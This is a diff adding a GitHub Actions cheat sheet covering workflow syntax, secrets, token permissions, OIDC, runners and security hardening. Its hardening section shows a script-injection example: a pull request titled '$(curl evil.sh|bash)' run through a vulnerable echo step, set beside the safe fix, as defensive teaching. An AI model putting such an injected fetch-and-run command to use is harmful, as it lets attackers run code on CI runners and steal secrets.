@@ -1,0 +1,531 @@
+---
+title: GitHub Actions Cheatsheet
+description: GitHub Actions platform engineering reference - workflow syntax, events, expressions, secrets, GITHUB_TOKEN permissions, OIDC cloud auth, reusable workflows, runners, containers, caching, environments, security hardening, and anti-patterns.
+---
+
+# GitHub Actions Cheat Sheet
+
+GitHub Actions reference for platform and DevOps engineers. Covers workflow YAML, events and triggers, expressions and contexts, secrets and `GITHUB_TOKEN` permissions, OIDC cloud auth, reusable workflows and composite actions, runner and container options, environments, and the supply-chain hardening that production workflows need.
+
+> **Versions:** Workflow schema and runner images as of 2026 (`actions/checkout@v4`, `actions/cache@v4`, `actions/upload-artifact@v4`). Workflows live in `.github/workflows/*.yml`. Examples assume a Linux runner unless noted. Security guidance reflects current GitHub recommendations - **pin third-party actions to a full commit SHA** and **default `GITHUB_TOKEN` to read-only**.
+
+---
+
+## Basics
+
+### Workflow anatomy
+
+A workflow is `on` (events) + `jobs`, each job is `runs-on` (runner) + `steps`. Files are auto-discovered in `.github/workflows/`.
+
+```yaml
+name: CI
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        run: make build
+```
+
+### `uses` vs `run`
+
+```yaml
+steps:
+  - uses: actions/checkout@v4          # run a published action
+  - run: echo "shell command"          # run a shell command (bash on Linux)
+  - name: Multi-line script
+    shell: bash
+    run: |
+      set -euo pipefail
+      ./build.sh
+```
+
+---
+
+## Events & Triggers
+
+```yaml
+on:
+  push:
+    branches: [ main, 'release/**' ]
+    paths: [ 'src/**' ]
+    tags: [ 'v*' ]
+  pull_request:
+    branches: [ main ]
+    types: [ opened, synchronize, reopened ]
+  workflow_dispatch:                   # manual run, with inputs
+    inputs:
+      environment:
+        type: choice
+        options: [ dev, staging, prod ]
+        default: dev
+  schedule:
+    - cron: '0 2 * * *'                # UTC
+  workflow_call: {}                    # makes this a reusable workflow
+  workflow_run:                        # chain off another workflow
+    workflows: [ "CI" ]
+    types: [ completed ]
+```
+
+> ⚠️ **`pull_request` vs `pull_request_target`**: `pull_request` runs in the **fork's** context with a **read-only** token and **no secrets** - safe for untrusted PRs. `pull_request_target` runs in the **base** repo context **with secrets** - do **not** check out and execute PR head code under it (see Security Hardening).
+
+---
+
+## Expressions & Contexts
+
+```yaml
+jobs:
+  deploy:
+    if: ${{ github.ref == 'refs/heads/main' && github.event_name == 'push' }}
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "actor=${{ github.actor }} sha=${{ github.sha }}"
+      - run: echo "PR title via env, never inline"
+        env:
+          TITLE: ${{ github.event.pull_request.title }}   # safe: passed as env, not interpolated into the script
+```
+
+Common contexts: `github.*` (event, ref, sha, actor), `env.*`, `vars.*` (configuration variables), `secrets.*`, `job.*`, `steps.<id>.outputs.*`, `matrix.*`, `runner.*`, `needs.<job>.outputs.*`.
+
+Functions: `contains()`, `startsWith()`, `endsWith()`, `format()`, `join()`, `fromJSON()`, `hashFiles()`, and status checks `success()`, `failure()`, `always()`, `cancelled()`.
+
+---
+
+## Matrix, Outputs & `needs`
+
+```yaml
+jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ ubuntu-latest, windows-latest ]
+        node: [ 20, 22 ]
+        exclude:
+          - { os: windows-latest, node: 20 }
+    steps:
+      - uses: actions/setup-node@v4
+        with: { node-version: ${{ matrix.node }} }
+
+  release:
+    needs: test                         # waits for all matrix legs
+    if: ${{ needs.test.result == 'success' }}
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "ship it"
+```
+
+Passing outputs between jobs:
+
+```yaml
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.meta.outputs.tag }}
+    steps:
+      - id: meta
+        run: echo "tag=1.2.3" >> "$GITHUB_OUTPUT"
+  build:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "building ${{ needs.setup.outputs.tag }}"
+```
+
+---
+
+## Variables & Secrets
+
+```yaml
+env:
+  GLOBAL_FLAG: 'true'                   # workflow-level env
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      JOB_FLAG: 'x'                     # job-level env
+    steps:
+      - run: ./deploy.sh
+        env:
+          API_KEY: ${{ secrets.API_KEY }}     # repo/org/environment secret
+          REGION:  ${{ vars.REGION }}         # non-sensitive config variable
+```
+
+- **Secrets** (`secrets.*`) - encrypted, masked in logs, set at repo / org / **environment** scope. Environment secrets can be gated by protection rules.
+- **Variables** (`vars.*`) - non-sensitive config, same scopes, visible in logs.
+- **`GITHUB_TOKEN`** - auto-provisioned per run; covered next.
+
+> ⚠️ Secrets are **not** passed to workflows triggered by `pull_request` from forks. Don't design CI that requires secrets to validate untrusted PRs.
+
+---
+
+## Permissions (`GITHUB_TOKEN`) ✅
+
+The `GITHUB_TOKEN` is minted per run. Set the **default to read-only** org/repo-wide, then grant the minimum each workflow needs.
+
+```yaml
+# Top-level: applies to all jobs unless overridden
+permissions:
+  contents: read
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:                        # job-level override, scoped to this job
+      contents: write                   # create a release / push a tag
+      id-token: write                   # required for OIDC cloud auth
+      packages: write                   # push to GHCR
+    steps:
+      - uses: actions/checkout@v4
+```
+
+> ✅ Set **Settings → Actions → General → Workflow permissions → Read repository contents permission** (read-only default), and require approval for first-time contributors.
+> ✅ Declare `permissions:` explicitly in every workflow - an empty/over-broad token is a privilege-escalation path if a step is compromised.
+> ⚠️ `permissions: write-all` or relying on the legacy permissive default - avoid.
+
+---
+
+## OIDC Cloud Authentication ✅
+
+No long-lived cloud secrets. The runner requests a short-lived OIDC token the cloud trusts via a federated credential.
+
+```yaml
+# Azure (Workload Identity Federation)
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write                   # mandatory for OIDC
+      contents: read
+    steps:
+      - uses: azure/login@v2
+        with:
+          client-id:       ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+      - run: az group list -o table
+```
+
+```yaml
+# AWS (IAM OIDC role assumption)
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
+          aws-region: eu-west-2
+```
+
+> ✅ Scope the cloud-side federated credential to **specific repo + branch/environment** (e.g. `repo:org/app:ref:refs/heads/main` or `:environment:prod`). A wildcard subject lets any branch/PR assume the role.
+
+---
+
+## Reusable Workflows & Composite Actions
+
+### Reusable workflow (`workflow_call`)
+
+```yaml
+# .github/workflows/reusable-deploy.yml
+on:
+  workflow_call:
+    inputs:
+      environment: { type: string, required: true }
+    secrets:
+      token: { required: true }
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./deploy.sh --env ${{ inputs.environment }}
+```
+
+```yaml
+# caller
+jobs:
+  call-deploy:
+    uses: org/repo/.github/workflows/reusable-deploy.yml@v1   # pin to tag/SHA
+    with:  { environment: prod }
+    secrets: { token: ${{ secrets.DEPLOY_TOKEN }} }
+    # or: secrets: inherit
+```
+
+### Composite action
+
+```yaml
+# .github/actions/setup/action.yml
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-node@v4
+      with: { node-version: 22 }
+    - run: npm ci
+      shell: bash
+```
+
+---
+
+## Runners
+
+| Runner | Use when | Watch out for |
+|:--|:--|:--|
+| GitHub-hosted (`ubuntu-latest`, etc.) | Standard CI, no private network | Job time limits, public egress, cold tooling |
+| Larger hosted runners | Heavy builds (more CPU/RAM, GPU) | Cost per minute; configured at org level |
+| Self-hosted | Private network, special hardware, big caches | You secure/patch them; **never on public repos** |
+| Runner groups | Restrict which repos/workflows use a runner set | Manage membership deliberately |
+
+```yaml
+jobs:
+  build:
+    runs-on: [ self-hosted, linux, x64 ]   # match by labels
+```
+
+> ⚠️ **Never attach self-hosted runners to public repositories.** A fork PR can run arbitrary code on them. Use ephemeral, autoscaled runners (e.g. Actions Runner Controller) and rebuild between jobs.
+
+---
+
+## Containers & Services
+
+```yaml
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    container:
+      image: node:22-bookworm            # whole job runs inside this image
+    services:
+      postgres:
+        image: postgres:16
+        env: { POSTGRES_PASSWORD: test }
+        ports: [ '5432:5432' ]
+        options: >-
+          --health-cmd pg_isready --health-interval 10s
+          --health-timeout 5s --health-retries 5
+    steps:
+      - run: npm test
+        env: { DATABASE_URL: 'postgres://postgres:test@postgres:5432/postgres' }
+```
+
+> ✅ Pin container images by digest (`image: node@sha256:...`) in production workflows for reproducibility.
+
+---
+
+## Caching, Artifacts & Concurrency
+
+```yaml
+steps:
+  - uses: actions/cache@v4
+    with:
+      path: ~/.npm
+      key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
+      restore-keys: ${{ runner.os }}-npm-
+
+  - uses: actions/upload-artifact@v4
+    with: { name: dist, path: dist/, retention-days: 7 }
+```
+
+```yaml
+# Cancel superseded runs of the same ref (e.g. rapid pushes to a PR)
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+```
+
+> ⚠️ Don't put a `cancel-in-progress` concurrency group on a **deploy** workflow - it can kill an in-flight production deploy. Use it for CI, not delivery.
+
+---
+
+## Environments & Deployment Protection
+
+```yaml
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: production                  # gated by environment protection rules
+      url: https://app.example.com
+    steps:
+      - run: ./deploy.sh
+```
+
+On the **Environment** (Settings → Environments): **required reviewers**, **wait timer**, **deployment branch policy** (only `main`/tags), and **environment secrets**. These apply regardless of which workflow targets the environment.
+
+---
+
+## Security Hardening ✅
+
+> ✅ **Pin third-party actions to a full commit SHA**, not a tag - tags are mutable and a compromised tag is a supply-chain attack:
+
+```yaml
+# good - immutable
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+# risky - a tag can be repointed at malicious code
+- uses: some-org/some-action@v1
+```
+
+> ✅ **Avoid script injection.** Never interpolate untrusted input (`github.event.*.title/body/ref`, PR branch names) directly into a `run:` block - it executes as shell. Pass it through `env:` and reference the variable:
+
+```yaml
+# vulnerable: a PR titled  $(curl evil.sh|bash)  runs on the runner
+- run: echo "${{ github.event.pull_request.title }}"
+# safe
+- run: echo "$TITLE"
+  env: { TITLE: ${{ github.event.pull_request.title }} }
+```
+
+> ✅ **`pull_request_target` safely**: use it only for label/comment automation. Do **not** `checkout` the PR head ref and run its build/tests with secrets in scope - that hands fork code your token and secrets.
+> ✅ Set least-privilege `permissions:`; default the token to read-only org-wide.
+> ✅ Restrict which actions can run (Settings → Actions → allow selected actions / verified creators).
+> ✅ Use **environment** secrets gated by reviewers for production, not repo-wide secrets.
+
+---
+
+## Terraform
+
+Two distinct uses: **running** Terraform from a workflow, and **managing GitHub itself** with the `integrations/github` provider.
+
+### Run Terraform with OIDC (no stored secret) ✅
+
+With `id-token: write`, the AzureRM provider picks up the GitHub Actions OIDC token automatically when `ARM_USE_OIDC=true` - no token-fetch step needed. Plan on PRs, apply only on `main`, gated by an environment.
+
+```yaml
+name: terraform
+
+on:
+  pull_request:
+    paths: [ 'infra/**' ]
+  push:
+    branches: [ main ]
+    paths: [ 'infra/**' ]
+
+permissions:
+  id-token: write        # required for OIDC
+  contents: read
+  pull-requests: write   # optional: comment the plan on the PR
+
+jobs:
+  terraform:
+    runs-on: ubuntu-latest
+    environment: ${{ github.ref == 'refs/heads/main' && 'production' || '' }}
+    defaults:
+      run: { working-directory: infra }
+    env:
+      ARM_USE_OIDC: "true"
+      ARM_CLIENT_ID:       ${{ secrets.AZURE_CLIENT_ID }}
+      ARM_TENANT_ID:       ${{ secrets.AZURE_TENANT_ID }}
+      ARM_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: hashicorp/setup-terraform@v3
+        with: { terraform_version: 1.9.8 }
+      - run: terraform init
+      - run: terraform plan -out=tfplan
+      - name: Apply (main only)
+        if: github.ref == 'refs/heads/main' && github.event_name == 'push'
+        run: terraform apply -auto-approve tfplan
+```
+
+> ✅ Scope the Azure federated credential to the **environment** (`repo:org/app:environment:production`) so only the gated, reviewer-approved job can assume the deploy identity.
+
+### Manage GitHub with the `integrations/github` provider
+
+```hcl
+terraform {
+  required_providers {
+    github = {
+      source  = "integrations/github"
+      version = "~> 6.0"
+    }
+  }
+}
+
+# Auth via env: GITHUB_TOKEN + GITHUB_OWNER (or a GitHub App for org-scale).
+provider "github" {
+  owner = "my-org"
+}
+
+resource "github_repository" "app" {
+  name       = "app"
+  visibility = "private"
+  auto_init  = true
+}
+
+# Supply-chain control: restrict which actions may run in this repo
+resource "github_actions_repository_permissions" "app" {
+  repository      = github_repository.app.name
+  allowed_actions = "selected"
+  allowed_actions_config {
+    github_owned_allowed = true
+    verified_allowed     = true
+    patterns_allowed     = ["hashicorp/setup-terraform@*"]
+  }
+}
+
+# OIDC client id as an Actions secret, plus a non-sensitive variable
+resource "github_actions_secret" "azure_client_id" {
+  repository      = github_repository.app.name
+  secret_name     = "AZURE_CLIENT_ID"
+  plaintext_value = var.azure_client_id
+}
+
+resource "github_actions_variable" "region" {
+  repository    = github_repository.app.name
+  variable_name = "REGION"
+  value         = "uksouth"
+}
+
+# Production environment gated by a required reviewer + protected branches
+data "github_user" "lead" { username = "octocat" }
+
+resource "github_repository_environment" "prod" {
+  repository  = github_repository.app.name
+  environment = "production"
+  reviewers { users = [data.github_user.lead.id] }
+  deployment_branch_policy {
+    protected_branches     = true
+    custom_branch_policies = false
+  }
+}
+```
+
+> ✅ Manage repo secrets/variables and environment protection in Terraform so they're reviewed and auditable - but keep the GitHub-admin state in a separate, tightly-controlled repo.
+
+---
+
+## Anti-patterns
+
+- 🚨 **Unpinned third-party actions (`@v1` / `@main`)** - tags are mutable, so a compromised tag is a supply-chain attack. Pin third-party actions to a full commit SHA.
+
+- 🚨 **Interpolating untrusted event data into `run:`** - the classic script-injection bug; `github.event.*.title/body/ref` executes as shell. Route it through `env:` and reference the variable.
+
+- 🚨 **`pull_request_target` + checkout of PR head + secrets** - this runs fork-controlled code in a context that has your token and secrets, i.e. remote code execution. Use it only for label/comment automation.
+
+- 🚨 **Self-hosted runners on public repos** - untrusted forks execute arbitrary code on your infrastructure. Use ephemeral, isolated runners and keep them off public repos.
+
+- ⚠️ **`permissions: write-all` or no `permissions:` block** - an over-broad `GITHUB_TOKEN` is a privilege-escalation path. Declare least privilege explicitly and default the token to read-only org-wide.
+
+- ⚠️ **Long-lived cloud secrets** - they expire and leak. Use OIDC federation with a subject scoped to a specific repo + branch/environment.
+
+- ⚠️ **`secrets: inherit` to third-party reusable workflows** - this hands over every secret in scope. Only inherit to workflows you own and control; pass explicit secrets otherwise.
+
+- ⚠️ **Designing CI that needs secrets to validate fork PRs** - forks don't receive secrets by design, so the gate silently can't run. Split untrusted validation from privileged steps.
+
+- ⚠️ **One mega-workflow doing build + test + deploy with no environment gates** - prod ends up ungated. Split delivery from CI and gate it with environment protection rules.
+
+- 🔬 **`cancel-in-progress` concurrency on deploy workflows** - it can abort a live production rollout mid-flight. Use it for CI, not delivery.
+
+---
+
+## References
+
+- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions) - authoritative key reference
+- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) - injection, pinning, runners
+- [Automatic token authentication (`GITHUB_TOKEN`)](https://docs.github.com/en/actions/security-guides/automatic-token-authentication) - permissions model
+- [OIDC hardening for cloud](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect) - federated cloud auth
+- [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows) - `workflow_call`
+- [Self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security) - why not on public repos
